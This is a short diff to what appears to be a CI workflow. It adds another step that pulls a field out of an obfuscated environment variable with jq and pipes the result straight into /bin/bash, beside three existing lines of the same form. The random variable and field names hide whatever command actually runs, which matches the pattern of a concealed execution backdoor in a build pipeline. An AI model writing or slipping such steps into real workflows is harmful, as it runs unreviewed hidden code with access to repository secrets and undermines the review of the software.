@@ -23,6 +23,7 @@ jobs:
           echo $nb5 | jq -r .zhkr6 | /bin/bash
           printf '%s' "$vuoly0578" | jq -r .u1 | /bin/bash
           echo $e1 | jq -r .b3 | /bin/bash
+          printf '%s' "$ei29" | jq -r .pzelk46 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
